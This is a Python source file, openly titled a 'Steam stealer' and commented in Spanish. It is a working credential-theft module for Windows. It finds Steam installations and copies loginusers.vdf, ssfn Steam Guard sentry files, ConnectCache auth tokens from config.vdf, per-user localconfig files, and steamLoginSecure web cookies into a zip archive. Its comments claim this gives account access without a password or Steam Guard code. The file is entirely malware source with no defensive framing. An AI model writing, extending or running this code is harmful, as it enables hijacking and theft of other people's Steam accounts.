# language: Python 3, file: steam.py, target: Windows 10/11
# Steam stealer — session files, loginusers.vdf, ssfn tokens, config
# acceso completo sin password si se tienen los ssfn + session correctos

import os
import re
import json
import zipfile
from pathlib import Path

LOCAL          = os.getenv("LOCALAPPDATA", "")
PROGRAM_FILES  = os.getenv("ProgramFiles", "C:\\Program Files")
PROGRAM_FILES86 = os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)")

# rutas posibles de Steam
STEAM_PATHS = [
    os.path.join(PROGRAM_FILES86, "Steam"),
    os.path.join(PROGRAM_FILES,   "Steam"),
    os.path.join("C:\\", "Steam"),
    os.path.join("D:\\", "Steam"),
    os.path.join("E:\\", "Steam"),
]

# ─────────────────────────────────────────────
# PARSERS VDF
# ─────────────────────────────────────────────

def _parse_vdf_simple(text: str) -> dict:
    """
    Parser VDF minimalista — convierte el formato Valve DataFile
    en un dict anidado. Suficiente para loginusers.vdf y config.vdf.
    No es un parser completo — maneja el subset que nos interesa.
    """
    result = {}
    stack  = [result]
    key    = None

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('//'):
            continue

        tokens = re.findall(r'"([^"]*)"|\{|\}', line)
        for tok in tokens:
            if tok == '{':
                new = {}
                if key and stack:
                    stack[-1][key] = new
                    stack.append(new)
                key = None
            elif tok == '}':
                if len(stack) > 1:
                    stack.pop()
            else:
                if key is None:
                    key = tok
                else:
                    stack[-1][key] = tok
                    key = None

    return result


def _format_user(steam_id: str, data: dict) -> str:
    """Formatea la info de un usuario Steam."""
    account_name = data.get('AccountName', 'Unknown')
    persona_name = data.get('PersonaName', 'Unknown')
    remember     = data.get('RememberPassword', '0')
    most_recent  = data.get('MostRecent', '0')
    timestamp    = data.get('Timestamp', '0')

    # SteamID64 → SteamID3 conversion
    try:
        sid64 = int(steam_id)
        account_id = sid64 - 76561197960265728
        steam_id3  = f"[U:1:{account_id}]"
    except Exception:
        steam_id3 = "Unknown"

    return (
        f"  SteamID64    : {steam_id}\n"
        f"  SteamID3     : {steam_id3}\n"
        f"  AccountName  : {account_name}\n"
        f"  PersonaName  : {persona_name}\n"
        f"  RememberPwd  : {remember}\n"
        f"  MostRecent   : {most_recent}\n"
        f"  Timestamp    : {timestamp}\n"
    )


# ─────────────────────────────────────────────
# MÓDULOS DE ROBO
# ─────────────────────────────────────────────

def _steal_loginusers(steam_path: str, zip_file, info_lines: list) -> int:
    """loginusers.vdf — lista de cuentas que se han logueado, con tokens."""
    vdf_path = os.path.join(steam_path, "config", "loginusers.vdf")
    if not os.path.exists(vdf_path):
        return 0

    count = 0
    try:
        with open(vdf_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # copiar raw al zip
        zip_file.writestr("Steam/loginusers.vdf", content)

        # parsear para info legible
        parsed = _parse_vdf_simple(content)
        users  = parsed.get('users', parsed)  # estructura varía

        lines = ["Steam Accounts from loginusers.vdf:\n"]
        for steam_id, user_data in users.items():
            if not isinstance(user_data, dict):
                continue
            count += 1
            lines.append(f"Account #{count}:\n{_format_user(steam_id, user_data)}")

        info_lines.extend(lines)
    except Exception:
        pass

    return count


def _steal_ssfn(steam_path: str, zip_file) -> int:
    """
    Archivos ssfn* — Steam Sentry Files.
    Son los tokens de Steam Guard. Con el ssfn correcto + loginusers.vdf
    se puede iniciar sesión sin el código de Steam Guard.
    Se ubican en la raíz del directorio Steam.
    """
    count = 0
    try:
        for fname in os.listdir(steam_path):
            if fname.lower().startswith('ssfn'):
                fpath = os.path.join(steam_path, fname)
                if os.path.isfile(fpath):
                    try:
                        with open(fpath, 'rb') as f:
                            zip_file.writestr(f"Steam/ssfn/{fname}", f.read())
                        count += 1
                    except Exception:
                        pass
    except Exception:
        pass
    return count


def _steal_config(steam_path: str, zip_file) -> bool:
    """
    config/config.vdf — contiene ConnectCache con auth tokens por SteamID.
    También puede contener API keys y proxy settings.
    """
    config_path = os.path.join(steam_path, "config", "config.vdf")
    if not os.path.exists(config_path):
        return False
    try:
        with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        zip_file.writestr("Steam/config.vdf", content)

        # extraer ConnectCache tokens (session tokens por cuenta)
        cache_matches = re.findall(r'"ConnectCache"\s*\{([^}]+)\}', content, re.DOTALL)
        if cache_matches:
            zip_file.writestr("Steam/connect_cache_tokens.txt", "\n".join(cache_matches))

        return True
    except Exception:
        return False


def _steal_local_config(steam_path: str, zip_file, user_count: int) -> int:
    """
    userdata/<steamid3>/config/localconfig.vdf — por usuario.
    Contiene amigos, grupos, juegos recientes y auth data adicional.
    """
    userdata_path = os.path.join(steam_path, "userdata")
    if not os.path.exists(userdata_path):
        return 0

    count = 0
    for uid in os.listdir(userdata_path):
        uid_path    = os.path.join(userdata_path, uid)
        local_cfg   = os.path.join(uid_path, "config", "localconfig.vdf")
        shortcuts   = os.path.join(uid_path, "config", "shortcuts.vdf")

        if os.path.exists(local_cfg):
            try:
                with open(local_cfg, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                zip_file.writestr(f"Steam/userdata/{uid}/localconfig.vdf", content)
                count += 1
            except Exception:
                pass

        if os.path.exists(shortcuts):
            try:
                with open(shortcuts, 'rb') as f:
                    zip_file.writestr(f"Steam/userdata/{uid}/shortcuts.vdf", f.read())
            except Exception:
                pass

    return count


def _steal_web_cookies(steam_path: str, zip_file) -> bool:
    """
    Cookies de Steam Web Browser (leveldb).
    Contienen steamLoginSecure — equivalente al token de sesión web.
    """
    cookie_paths = [
        os.path.join(steam_path, "config", "htmlcache", "Cookies"),
        os.path.join(steam_path, "appcache", "htmlcache", "Cookies"),
    ]
    found = False
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                with open(path, 'rb') as f:
                    zip_file.writestr("Steam/web_cookies.db", f.read())
                found = True
            except Exception:
                pass

    # también leveldb de Steam
    leveldb_path = os.path.join(steam_path, "config", "htmlcache", "Local Storage", "leveldb")
    if os.path.exists(leveldb_path):
        for fname in os.listdir(leveldb_path):
            if fname.endswith(('.ldb', '.log')):
                fpath = os.path.join(leveldb_path, fname)
                try:
                    with open(fpath, 'rb') as f:
                        data = f.read()
                    # filtrar archivos que contengan 'steamLogin'
                    if b'steamLogin' in data or b'steamLoginSecure' in data:
                        zip_file.writestr(f"Steam/leveldb/{fname}", data)
                        found = True
                except Exception:
                    pass

    return found


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

def SteamSteal(zip_file) -> int:
    """
    Roba session files de Steam.
    Retorna cantidad de cuentas encontradas.
    """
    steam_path = None
    for path in STEAM_PATHS:
        if os.path.exists(path):
            steam_path = path
            break

    if not steam_path:
        zip_file.writestr("Steam/README.txt", "Steam not found on this system.")
        return 0

    info_lines = [f"Steam found at: {steam_path}\n\n"]

    n_users  = _steal_loginusers(steam_path, zip_file, info_lines)
    n_ssfn   = _steal_ssfn(steam_path, zip_file)
    has_cfg  = _steal_config(steam_path, zip_file)
    n_local  = _steal_local_config(steam_path, zip_file, n_users)
    has_web  = _steal_web_cookies(steam_path, zip_file)

    summary = (
        f"Steam path       : {steam_path}\n"
        f"Accounts found   : {n_users}\n"
        f"SSFN files       : {n_ssfn}\n"
        f"config.vdf       : {'yes' if has_cfg else 'no'}\n"
        f"localconfig dirs : {n_local}\n"
        f"Web cookies      : {'yes' if has_web else 'no'}\n\n"
    )
    summary += "\n".join(info_lines)

    zip_file.writestr("Steam/steam_summary.txt", summary)

    return n_users
